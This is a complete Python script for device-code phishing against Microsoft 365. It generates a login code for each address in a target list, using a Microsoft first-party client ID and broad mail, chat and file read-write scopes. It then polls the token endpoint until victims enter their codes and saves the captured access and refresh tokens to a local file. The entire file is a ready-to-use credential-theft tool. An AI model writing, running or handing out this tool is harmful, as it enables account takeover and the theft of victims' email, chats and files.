import requests
import sys
from rich import print
import json

#########Global variable###########
code_url=""
device_token=""
device_code=""
code_url=""
user_code=""
token_array=[]
log_array=[]
SCOPES = (
    "User.Read "
    "Mail.Read Mail.ReadWrite Mail.Send "
    "Chat.Read Chat.ReadWrite ChatMessage.Send "
    "Files.Read Files.ReadWrite Files.Read.All Files.ReadWrite.All "
    "offline_access openid profile"
)

def generate_deviceCodeRequest():
	try:
		print("Generating device code for each email ...")
		with open('email.txt', 'r') as file:
			for email in file:
				response=requests.post(
					"https://login.microsoftonline.com/common/oauth2/v2.0/devicecode",  # ✅ changed
					data={
						"client_id":'d3590ed6-52b3-4102-aeff-aad2292ab01c',
						"scope":SCOPES  # ✅ changed (removed resource)
					}
				)
				j_response=json.loads(response.text)
				global user_code
				global device_token
				global device_code
				global code_url
				global token_array
				global log_array
				user_code=j_response["user_code"]
				device_token=j_response["device_code"]
				code_url=j_response["verification_uri"]  # ✅ changed (v2.0 uses verification_uri)
				data = {
					"target": "{}".format(email.strip()),
    					"user_code": "{}".format(user_code),
    					"device_token": "{}".format(device_token),
					}
				log_array.append(data)
				token_array.append([email.strip(),device_token])
	except FileNotFoundError:
		print("email.txt was not found")
		sys.exit(1)

def print_info():
	print("Code URL : {} ".format(code_url))
	print("\nDevice token : {}".format(device_token))
	print("\nUser code : {}".format(user_code))

def checkAndGetToken():
	print("\n\nStarting listerner server and looping all the device code")
	print("Waiting authentication in https://microsoft.com/devicelogin") 
	while True:
		if (len(token_array)==0):
			print("No more device code was available")
			break
		else:
			for email,token in token_array:
				response=requests.post(
					"https://login.microsoftonline.com/common/oauth2/v2.0/token",  # ✅ changed
					data={
						"client_id":'d3590ed6-52b3-4102-aeff-aad2292ab01c',
						"grant_type":'urn:ietf:params:oauth:grant-type:device_code',
						"device_code":'{}'.format(token),  # ✅ changed (v2.0 uses device_code)
						"scope":SCOPES  # ✅ changed (use scope instead of resource)
					}
				)
				if response.status_code==200:
					print("\n===============Result======================")
					j_response=json.loads(response.text)
					print("User: {}".format(email))
					print("Token type: {}".format(j_response["token_type"]))
					print("Expired on: {}".format(j_response["expires_in"]))  # ✅ changed (v2.0 returns expires_in)
					print("\nAccess Token: {}".format(j_response["access_token"]))
					print("\nRefresh Token : {}".format(j_response["refresh_token"]))
					file=open("token.txt", "a")
					file.write("=============================\n")
					file.write("User: {}\n".format(email))
					file.write("Token type: {}\n".format(j_response["token_type"]))
					file.write("Expired on: {}\n\n".format(j_response["expires_in"]))  # ✅ changed
					file.write("Access Token: {}\n\n".format(j_response["access_token"]))
					file.write("Refresh Token : {}\n\n".format(j_response["refresh_token"]))
					file.close()
					token_array.remove([email,token])
					break

def main ():
	generate_deviceCodeRequest()
	file=open("log.txt", "w")
	file.writelines(str(log_array))
	file.close()
	print_info()
	try:
		checkAndGetToken()
	except KeyboardInterrupt:
		print("Exiting the program ...")

if __name__ == '__main__':
	main()
